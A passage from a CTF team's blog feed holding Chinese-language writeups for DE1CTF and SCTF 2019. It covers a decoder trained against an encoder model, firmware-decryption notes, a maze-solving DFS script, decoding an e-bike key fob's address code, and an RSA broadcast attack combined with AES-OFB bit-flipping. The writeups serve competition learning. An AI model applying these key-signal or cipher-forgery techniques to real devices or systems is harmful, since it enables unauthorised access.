class="number">0.2</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mse</span><span class="params">(true, predict)</span>:</span></span><br><span class="line">    loss = np.average(np.abs(true - predict))</span><br><span class="line">    print(loss)</span><br><span class="line">    <span class="keyword">return</span> loss</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">judge</span><span class="params">(predict)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> mse(flag, predict) &lt; threshold:</span><br><span class="line">        print(true_flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"You can't fool me"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    inp = input(<span class="string">"Input your flag_dec result:"</span>)</span><br><span class="line">    inp = np.asarray(inp.split(<span class="string">' '</span>), dtype=float)</span><br><span class="line">    judge(inp)</span><br></pre></td></tr></table></figure></li></ul><h4><span id="解题脚本">解题脚本</span></h4><p>利用AutoEncoderDecoder思路，利用所给的Enc模型，训练解密模型。</p><p>可以直接运行<code>python solve.py</code>，结果在flag_dec.txt中，直接复制到到云服务器上进行检验，底下也有已经通过解密的结果。（可能要跑几次才能出结果，所以我测试的时候用的是本地测试）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">requirements</span><br><span class="line"></span><br><span class="line">keras</span><br><span class="line">sklearn</span><br><span class="line">numpy</span><br></pre></td></tr></table></figure><p>Dec model:</p><table><thead><tr class="header"><th style="text-align: center;">Layer (type)</th><th style="text-align: center;">Output Shape</th><th style="text-align: center;">Param</th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">input_1 (InputLayer)</td><td style="text-align: center;">(None, 64)</td><td style="text-align: center;">0</td></tr><tr class="even"><td style="text-align: center;">dense_1 (Dense)</td><td style="text-align: center;">(None, 2048)</td><td style="text-align: center;">133120</td></tr><tr class="odd"><td style="text-align: center;">dense_2 (Dense)</td><td style="text-align: center;">(None, 2048)</td><td style="text-align: center;">4196352</td></tr><tr class="even"><td style="text-align: center;">dense_3 (Dense)</td><td style="text-align: center;">(None, 128)</td><td style="text-align: center;">262272</td></tr></tbody></table><p>Total params: 4,591,744</p><p>Trainable params: 4,591,744</p><p>Non-trainable params: 0 _________________________________________________________________ AutoEncoderDecoder：</p><table><thead><tr class="header"><th style="text-align: center;">Layer (type)</th><th style="text-align: center;">Output Shape</th><th style="text-align: center;">Param</th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">Enc (Model)</td><td style="text-align: center;">(None, 64)</td><td style="text-align: center;">8256</td></tr><tr class="even"><td style="text-align: center;">Dec (Model)</td><td style="text-align: center;">(None, 128)</td><td style="text-align: center;">4591744</td></tr></tbody></table><p>Total params: 4,600,000</p><p>Trainable params: 4,591,744</p><p>Non-trainable params: 8,256 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec_model</span><span class="params">(enc_shape, flag_shape)</span>:</span></span><br><span class="line">    inp = Input((enc_shape,))</span><br><span class="line">    h = Dense(<span class="number">2048</span>)(inp)</span><br><span class="line">    h = Dense(<span class="number">2048</span>)(h)</span><br><span class="line">    out = Dense(flag_shape, activation=<span class="string">'sigmoid'</span>)(h)</span><br><span class="line">    <span class="keyword">return</span> Model(inp, out)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load_data</span><span class="params">(flag_name, enc_name)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :param path: data path</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">        flag_sample: shape=(512,128)</span></span><br><span class="line"><span class="string">        enc_sample:shape=(512,64)</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    flag_sample = np.loadtxt(flag_name)</span><br><span class="line">    enc_sample = np.loadtxt(enc_name)</span><br><span class="line">    <span class="keyword">return</span> flag_sample, enc_sample</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">train_dec</span><span class="params">(flag_sample, enc_sample)</span>:</span></span><br><span class="line">    flag_shape = flag_sample.shape[<span class="number">-1</span>]</span><br><span class="line">    enc_shape = enc_sample.shape[<span class="number">-1</span>]</span><br><span class="line">    Enc_model = load_model(<span class="string">"../model/enc.hdf5"</span>)</span><br><span class="line">    Enc_model.name = <span class="string">"Enc"</span></span><br><span class="line">    Dec_model = dec_model(enc_shape, flag_shape)</span><br><span class="line">    print(<span class="string">"Train Dec_model"</span>)</span><br><span class="line">    Enc_model.trainable = <span class="keyword">False</span></span><br><span class="line">    inp = Enc_model.inputs</span><br><span class="line">    dec = Enc_model(inp)</span><br><span class="line">    out = Dec_model(dec)</span><br><span class="line">    model = Model(inp, out)</span><br><span class="line">    model.compile(loss=<span class="string">'mean_absolute_error'</span>, optimizer=<span class="string">'Adam'</span>)</span><br><span class="line">    print(model.summary())</span><br><span class="line">    ear = EarlyStopping(monitor=<span class="string">'val_loss'</span>, patience=<span class="number">10</span>, mode=<span class="string">'min'</span>, restore_best_weights=<span class="keyword">True</span>)</span><br><span class="line">    model.fit(flag_sample, flag_sample, batch_size=<span class="number">512</span>, epochs=<span class="number">100000000</span>, verbose=<span class="number">2</span>, validation_split=<span class="number">0.1</span>,</span><br><span class="line">              callbacks=[ear])</span><br><span class="line">    print(Dec_model.summary())</span><br><span class="line">    Dec_model.save(dec_loss0<span class="number">.177</span>.hdf5)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span><span class="params">()</span>:</span></span><br><span class="line">    Dec_model = load_model(dec_loss0<span class="number">.177</span>.hdf5)</span><br><span class="line">    flag_enc = np.loadtxt(<span class="string">"../data/flag_enc.txt"</span>).reshape(<span class="number">1</span>, <span class="number">-1</span>)</span><br><span class="line">    flag_dec = Dec_model.predict(flag_enc)</span><br><span class="line">    np.savetxt(<span class="string">"../data/flag_dec.txt"</span>, flag_dec)</span><br><span class="line">    <span class="comment"># print(flag_dec[0])</span></span><br><span class="line">    judge(flag_dec[<span class="number">0</span>])</span><br></pre></td></tr></table></figure></p><h4><span id="结果">结果</span></h4><p>loss: 0.17741050019098772</p><p>delta{xxx_xxx_xxx}</p><p>flag: &gt;1 0 1 1 1 1 0 1 1 1 0 1 0 0 0 1 0 1 1 1 1 1 1 1 1 0 0 0 0 1 0 1 1 0 1 0 0 0 1 0 0 0 1 0 1 0 0 0 1 1 1 0 1 1 0 1 1 0 0 0 0 1 1 0 0 1 1 0 0 0 0 1 1 1 1 0 0 1 0 0 0 0 0 1 1 0 0 1 1 1 1 0 1 0 1 1 1 1 0 0 0 1 1 0 0 1 1 0 0 0 1 1 1 1 0 0 1 0 0 1 1 1 0 1 1 1 0 0</p><p>flag_enc: &gt;-4.286013841629028320e-01 9.896190166473388672e-01 4.559664130210876465e-01 8.176887035369873047e-01 8.356271386146545410e-01 3.765194416046142578e-01 1.687297374010086060e-01 3.029667437076568604e-01 5.969925522804260254e-01 5.114848613739013672e-01 9.926454722881317139e-02 9.131879210472106934e-01 -2.152046710252761841e-01 8.866041898727416992e-02 3.317154347896575928e-01 9.851776361465454102e-01 7.276151180267333984e-01 8.283065557479858398e-01 1.823632977902889252e-03 3.699933588504791260e-01 6.979680061340332031e-02 1.828217357397079468e-01 5.757516622543334961e-01 1.914786100387573242e-01 3.244600296020507812e-01 1.111515283584594727e+00 5.159097313880920410e-01 1.231751441955566406e-01 -3.645407259464263916e-01 7.166512608528137207e-01 1.389274299144744873e-01 7.724004983901977539e-02 7.178838849067687988e-01 -9.603453427553176880e-02 5.028448104858398438e-01 3.499638140201568604e-01 8.395515680313110352e-01 6.976196765899658203e-01 2.593761086463928223e-01 7.141951918601989746e-01 6.022385954856872559e-01 1.001740217208862305e+00 -2.897696197032928467e-01 1.448748558759689331e-01 8.408914208412170410e-01 2.470737695693969727e-01 4.430454969406127930e-01 -2.019447684288024902e-01 8.161327838897705078e-01 2.832469642162322998e-01 6.612138748168945312e-01 9.899861216545104980e-01 2.219144105911254883e-01 1.322134375572204590e+00 7.497617006301879883e-01 9.182292222976684570e-01 6.070237755775451660e-01 3.877772092819213867e-01 3.660472482442855835e-02 7.972034811973571777e-01 -2.158393338322639465e-02 5.925227403640747070e-01 5.734952688217163086e-01 -5.487446486949920654e-02</p><p>flag_dec: &gt;9.999969005584716797e-01 1.000000000000000000e+00 1.000000000000000000e+00 8.216343522071838379e-01 1.000000000000000000e+00 2.449917824165481761e-09 4.793806410857692768e-13 9.827108979225158691e-01 1.000000000000000000e+00 9.518706798553466797e-01 4.392772812167322627e-09 6.113789975643157959e-03 4.152511974098160863e-05 4.196180736215637808e-09 7.207927703857421875e-01 2.705646342008542066e-14 6.214135623849870171e-07 9.999998807907104492e-01 9.499107003211975098e-01 1.000000000000000000e+00 1.000000000000000000e+00 1.000000000000000000e+00 1.000000000000000000e+00 1.000000000000000000e+00 9.999998807907104492e-01 1.134839401270570924e-12 1.000000000000000000e+00 1.000000000000000000e+00 1.772474402327793816e-22 9.627295136451721191e-01 8.082498652584035881e-07 5.288467742502689362e-03 1.000000000000000000e+00 1.356615761025602163e-14 9.699743986129760742e-01 9.680391289293766022e-03 1.000000000000000000e+00 3.494189800782449007e-13 1.000000000000000000e+00 3.159084932123808198e-14 2.154111511019039804e-14 5.770184313065346467e-16 1.000000000000000000e+00 1.002021781459916383e-05 9.999998807907104492e-01 8.955678204074501991e-04 1.000000000000000000e+00 9.489459000600186244e-18 8.299213051795959473e-01 9.961280226707458496e-01 9.470678567886352539e-01 1.103274103880202014e-22 1.000000000000000000e+00 6.979074478149414062e-01 2.365609405194221800e-20 1.000000000000000000e+00 1.000000000000000000e+00 1.236146737271584528e-13 6.457178387790918350e-04 5.910291671752929688e-01 9.847130749696120233e-11 1.000000000000000000e+00 2.832969698829401750e-07 3.806088219523060032e-21 4.788258164282160009e-21 1.000000000000000000e+00 1.000000000000000000e+00 9.999659061431884766e-01 6.373043248686371953e-08 9.844582080841064453e-01 1.429801388397322626e-09 9.504914879798889160e-01 9.991403818130493164e-01 2.418865845658057272e-19 1.000000000000000000e+00 2.270782504153226976e-17 2.376812939172689987e-12 1.000000000000000000e+00 1.241249365389798104e-14 1.346701979637145996e-01 3.604641086571485015e-16 3.174040572003981712e-17 2.682143889551155425e-18 1.000000000000000000e+00 1.000000000000000000e+00 1.364883929491043091e-01 4.823155208555363060e-09 8.947684168815612793e-01 4.979012906551361084e-02 9.936627149581909180e-01 1.000000000000000000e+00 6.171471613924950361e-05 1.000000000000000000e+00 3.350817401326366962e-10 9.962311387062072754e-01 8.754302263259887695e-01 1.577300601240949618e-08 1.000000000000000000e+00 8.513422443141155371e-14 1.534198522347082760e-13 4.049778076177301201e-16 5.455599006151120746e-18 8.422639439231716096e-06 6.625648587942123413e-02 2.438588886377601739e-09 1.000000000000000000e+00 1.000000000000000000e+00 3.147949101389713178e-08 7.443545779750593283e-11 7.562025007915029740e-13 9.984059929847717285e-01 1.000000000000000000e+00 1.000000000000000000e+00 9.997273981571197510e-02 6.106127430939578549e-13 4.462333163246512413e-05 9.999997615814208984e-01 1.432137628991099035e-24 9.999928474426269531e-01 1.000000000000000000e+00 2.727753134479371511e-09 1.000000000000000000e+00 2.289682043965513003e-07 9.587925076484680176e-01 9.999778270721435547e-01 1.000000000000000000e+00 1.434007310308516026e-03 7.365300120909523685e-07</p><h2><span id="upgrade">Upgrade</span></h2><p>出这个类型的题，主要是考察选手对加密固件的提取，题目涉及的是DIR-850L固件的真实加解密，也是希望选手在做了题之后有所收获，能够在真实设备上做进一步的漏洞挖掘</p><p>这道题有两个预期解，一是直接通过逆向升级的部分编写解密脚本，加密不是很难，已给出了AES所需的key，对设备有一些研究的在看了这个cgi-bin之后通常都能猜到是哪些型号，所以我patch掉了一些信息；二是巧解，在固件升级的过程中他可以直接调用解密程序对固件解密，所以需要qemu运行一个同架构的虚拟机，然后调用解密程序解出来</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;de1ta-team&quot;&gt;&lt;strong&gt;De1ta-Team&lt;/strong&gt;&lt;/h1&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://blog.de1ta.com/tags/ctf/"/>
    
      <category term="re" scheme="https://blog.de1ta.com/tags/re/"/>
    
      <category term="web" scheme="https://blog.de1ta.com/tags/web/"/>
    
      <category term="crypto" scheme="https://blog.de1ta.com/tags/crypto/"/>
    
      <category term="pwn" scheme="https://blog.de1ta.com/tags/pwn/"/>
    
      <category term="misc" scheme="https://blog.de1ta.com/tags/misc/"/>
    
      <category term="writeup" scheme="https://blog.de1ta.com/tags/writeup/"/>
    
      <category term="de1ctf" scheme="https://blog.de1ta.com/tags/de1ctf/"/>
    
  </entry>
  
  <entry>
    <title>SCTF 2019 Writeup</title>
    <link href="https://blog.de1ta.com/2019/06/24/sctf2019/"/>
    <id>https://blog.de1ta.com/2019/06/24/sctf2019/</id>
    <published>2019-06-24T04:28:00.000Z</published>
    <updated>2020-05-07T04:29:40.578Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="de1ta-team"><strong>De1ta-Team</strong></span></h1><a id="more"></a><blockquote><p>Team：De1ta</p></blockquote><h1><span id="前排广告位">前排广告位</span></h1><blockquote><p>De1ta长期招Web/逆向/pwn/密码学/硬件/取证/杂项/etc.选手</p><p>有意向的大佬请联系ZGUxdGFAcHJvdG9ubWFpbC5jb20=</p><p>De1ta是一个充满活力的CTF团队，成立至今的一年里，我们在不断变强，也在不断完善内部的制度，使得De1ta的每一位成员都能在技术和热情上保持提升，欢迎各位师傅的加入，尤其欢迎CTF新起之秀的加入。</p></blockquote><!-- toc --><ul><li><a href="#misc">Misc</a><ul><li><a href="#签到">签到</a></li><li><a href="#头号玩家">头号玩家</a></li><li><a href="#maaaaaaze">Maaaaaaze</a></li><li><a href="#打开电动车">打开电动车</a></li></ul></li><li><a href="#crypto">Crypto</a><ul><li><a href="#babygame">babygame</a></li><li><a href="#warmup">warmup</a></li></ul></li><li><a href="#web">Web</a><ul><li><a href="#math-is-fun1">math-is-fun1</a></li><li><a href="#math-is-fun2">math-is-fun2</a></li><li><a href="#easy-web">easy-web</a></li><li><a href="#flag-shop">flag shop</a></li></ul></li><li><a href="#re">Re</a><ul><li><a href="#who-is-he">Who is he</a></li><li><a href="#creakme">Creakme</a></li><li><a href="#babyre">babyre</a></li><li><a href="#strange-apk">strange apk</a></li><li><a href="#music">music</a></li></ul></li><li><a href="#pwn">Pwn</a><ul><li><a href="#one_heap">one_heap</a></li><li><a href="#two_heap">two_heap</a></li><li><a href="#easy_heap">easy_heap</a></li></ul></li><li><a href="#彩蛋">彩蛋</a></li></ul><!-- tocstop --><h1><span id="misc">Misc</span></h1><h2><span id="签到">签到</span></h2><blockquote><p>关注公众号，cat /flag</p></blockquote><h2><span id="头号玩家">头号玩家</span></h2><blockquote><p>一直往上走flag就出来了</p><figure><img src="https://p0.ssl.qhimg.com/t01382fc4f593a308ce.png" alt><figcaption>image.png</figcaption></figure><p>sctf{You_Are_The_Ready_Player_One!!!For_Sure!!!}</p></blockquote><h2><span id="maaaaaaze">Maaaaaaze</span></h2><blockquote><p>找迷宫中任意两点最大路径</p><p>最后答案是4056</p><p>把html处理一下，然后任意取一个点作为起点，扔到dfs里跑最长路径，等跑不动的时候拿当前最长路径的重点作为起点再扔进去跑，来回几次就得到4056了</p><p>exp.py <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="keyword">import</span> sys</span><br><span class="line">&gt; sys.setrecursionlimit(<span class="number">100000</span>)</span><br><span class="line">&gt; </span><br><span class="line">&gt; file = open(<span class="string">"sctfmaze.txt"</span>)</span><br><span class="line">&gt; maze = [[<span class="number">0</span> <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">100</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">100</span>)]</span><br><span class="line">&gt; vis = [[<span class="number">0</span> <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">100</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">100</span>)]</span><br><span class="line">&gt; <span class="class"><span class="keyword">class</span> <span class="title">Node</span>:</span></span><br><span class="line">&gt;    t = <span class="number">0</span></span><br><span class="line">&gt;    r = <span class="number">0</span></span><br><span class="line">&gt;    b = <span class="number">0</span></span><br><span class="line">&gt;    l = <span class="number">0</span></span><br><span class="line">&gt; <span class="comment">#print maze</span></span><br><span class="line">&gt; <span class="keyword">for</span> line <span class="keyword">in</span> file:</span><br><span class="line">&gt;    a = line[:<span class="number">-1</span>].split(<span class="string">" "</span>)</span><br><span class="line">&gt;    <span class="comment">#print a</span></span><br><span class="line">&gt;    n = Node()</span><br><span class="line">&gt;    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,len(a)):</span><br><span class="line">&gt;        <span class="comment">#print a[i],</span></span><br><span class="line">&gt;        <span class="keyword">if</span> a[i] == <span class="string">'0'</span> :</span><br><span class="line">&gt;            n.t = <span class="number">1</span></span><br><span class="line">&gt;        <span class="keyword">if</span> a[i] == <span class="string">'1'</span> :</span><br><span class="line">&gt;            n.r = <span class="number">1</span></span><br><span class="line">&gt;        <span class="keyword">if</span> a[i] == <span class="string">'2'</span> :</span><br><span class="line">&gt;            n.b = <span class="number">1</span></span><br><span class="line">&gt;        <span class="keyword">if</span> a[i] == <span class="string">'3'</span> :</span><br><span class="line">&gt;            n.l = <span class="number">1</span></span><br><span class="line">&gt;        <span class="comment">#print a[i],</span></span><br><span class="line">&gt;    <span class="comment">#print</span></span><br><span class="line">&gt;    maze[int(a[<span class="number">0</span>])][int(a[<span class="number">1</span>])] = n</span><br><span class="line">&gt;    <span class="comment">#print a[0],a[1],maze[int(a[0])][int(a[1])].b</span></span><br><span class="line">&gt; <span class="comment">#exit()</span></span><br><span class="line">&gt; <span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(i,j)</span>:</span></span><br><span class="line">&gt;    <span class="keyword">if</span> i&gt;=<span class="number">100</span> <span class="keyword">or</span> i&lt;<span class="number">0</span> <span class="keyword">or</span> j&gt;=<span class="number">100</span> <span class="keyword">or</span> j&lt;<span class="number">0</span>:</span><br><span class="line">&gt;        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">&gt;    <span class="keyword">if</span> vis[i][j] == <span class="number">1</span>:</span><br><span class="line">&gt;        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">&gt;    <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="function"><span class="keyword">def</span> <span class="title">printmap</span><span class="params">()</span>:</span></span><br><span class="line">&gt;    <span class="keyword">global</span> vis</span><br><span class="line">&gt;    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">&gt;        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">&gt;            <span class="keyword">if</span> vis[i][j] == <span class="number">1</span>:</span><br><span class="line">&gt;                <span class="keyword">print</span> <span class="string">"%2d%2d"</span> % (i,j)</span><br><span class="line">&gt;            <span class="keyword">print</span> <span class="string">"    "</span></span><br><span class="line">&gt; </span><br><span class="line">&gt; maxx = <span class="number">0</span></span><br><span class="line">&gt; <span class="keyword">print</span> maxx,i,j</span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="function"><span class="keyword">def</span> <span class="title">dfs</span><span class="params">(i,j,n)</span>:</span></span><br><span class="line">&gt;    <span class="keyword">global</span> maxx</span><br><span class="line">&gt;    <span class="keyword">global</span> vis</span><br><span class="line">&gt;    <span class="keyword">global</span> maze</span><br><span class="line">&gt;    n += <span class="number">1</span></span><br><span class="line">&gt;   </span><br><span class="line">&gt;    <span class="comment">#print maxx,i,j,n,maze[i][j].t,maze[i][j].r,maze[i][j].b,maze[i][j].l</span></span><br><span class="line">&gt;    <span class="keyword">if</span> n&gt;maxx:</span><br><span class="line">&gt;        <span class="keyword">print</span> n,i,j</span><br><span class="line">&gt;        <span class="comment">#print n,i,j,maze[i][j].t,maze[i][j].r,maze[i][j].b,maze[i][j].l</span></span><br><span class="line">&gt;   </span><br><span class="line">&gt;        maxx = n</span><br><span class="line">&gt;    <span class="keyword">if</span> check(i<span class="number">-1</span>,j) <span class="keyword">and</span> maze[i][j].t == <span class="number">0</span>:</span><br><span class="line">&gt;        vis[i<span class="number">-1</span>][j] = <span class="number">1</span></span><br><span class="line">&gt;        dfs(i<span class="number">-1</span>,j,n)</span><br><span class="line">&gt;        vis[i<span class="number">-1</span>][j] = <span class="number">0</span></span><br><span class="line">&gt;    <span class="keyword">if</span> check(i,j+<span class="number">1</span>) <span class="keyword">and</span> maze[i][j].r == <span class="number">0</span>:</span><br><span class="line">&gt;        vis[i][j+<span class="number">1</span>] = <span class="number">1</span></span><br><span class="line">&gt;        dfs(i,j+<span class="number">1</span>,n)</span><br><span class="line">&gt;        vis[i][j+<span class="number">1</span>] = <span class="number">0</span></span><br><span class="line">&gt;    <span class="keyword">if</span> check(i+<span class="number">1</span>,j) <span class="keyword">and</span> maze[i][j].b == <span class="number">0</span>:</span><br><span class="line">&gt;        vis[i+<span class="number">1</span>][j] = <span class="number">1</span></span><br><span class="line">&gt;        dfs(i+<span class="number">1</span>,j,n)</span><br><span class="line">&gt;        vis[i+<span class="number">1</span>][j] = <span class="number">0</span></span><br><span class="line">&gt;    <span class="keyword">if</span> check(i,j<span class="number">-1</span>) <span class="keyword">and</span> maze[i][j].l == <span class="number">0</span>:</span><br><span class="line">&gt;        vis[i][j<span class="number">-1</span>] = <span class="number">1</span></span><br><span class="line">&gt;        dfs(i,j<span class="number">-1</span>,n)</span><br><span class="line">&gt;        vis[i][j<span class="number">-1</span>] = <span class="number">0</span></span><br><span class="line">&gt; </span><br><span class="line">&gt; vis[<span class="number">70</span>][<span class="number">22</span>] = <span class="number">1</span></span><br><span class="line">&gt; dfs(<span class="number">70</span>,<span class="number">22</span>,<span class="number">0</span>)</span><br><span class="line">&gt; exit()</span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">&gt;    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">&gt;        <span class="comment">#print i,j</span></span><br><span class="line">&gt;        vis[i][j] = <span class="number">1</span></span><br><span class="line">&gt;        dfs(i,j,<span class="number">0</span>)</span><br><span class="line">&gt;        vis[i][j] = <span class="number">0</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></p></blockquote><h2><span id="打开电动车">打开电动车</span></h2><blockquote><p>根据这篇文章</p><p>http://www.kb-iot.com/post/756.html</p><p>可知钥匙信号(PT224X) = 同步引导码(8bit) + 地址位(20bit) + 数据位(4bit) + 停止码(1bit)</p><p>用audacity打开信号文件，信号为 011101001010101001100010</p><p>这里题目截取到的信号中不包括同步码，前20位即为地址码，即为flag</p><p>sctf{01110100101010100110}</p><figure><img src="https://p0.ssl.qhimg.com/t01f32c3e4f38589eb6.png" alt><figcaption>image.png</figcaption></figure></blockquote><h1><span id="crypto">Crypto</span></h1><h2><span id="babygame">babygame</span></h2><blockquote><p>题目首先需要proof_of_work，要求m和rsa加密m之后再解密的结果不相同，让m比n大即可绕过</p><p>进入系统之后有两个选项</p><p>1.随机生成三组不同的a，b，n，使用相同的e=3，使得c=pow(a*m+b,e,n)，然后会给我们三组不同的a，b，n和c。最后再使用aes_ofb加密m，将结果也给我们。其中aes的iv和key都是随机生成的</p><p>2.我们需要输入aes_ofb加密之后的m的结果，其中m需要将其中的afternoon替换为morning，如果构造的正确则返回flag 解题思路：</p><p>1.通过Broadcast Attack with Linear Padding解出m为"I will send you the ticket tomorrow afternoon"</p><p>2.将m，修改后的m，以及aes_ofb加密之后的m的结果进行异或，得到的最终结果就是修改后的m进行aes_ofb加密之后的结果。将此结果发送给服务器便得到flag</p><p>sctf{7h15_ch4ll3n63_15_n07_h4rd_f0r_y0u_r16h7?}</p><p>解题脚本:</p><p>1.hastads.sage <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="function"><span class="keyword">def</span> <span 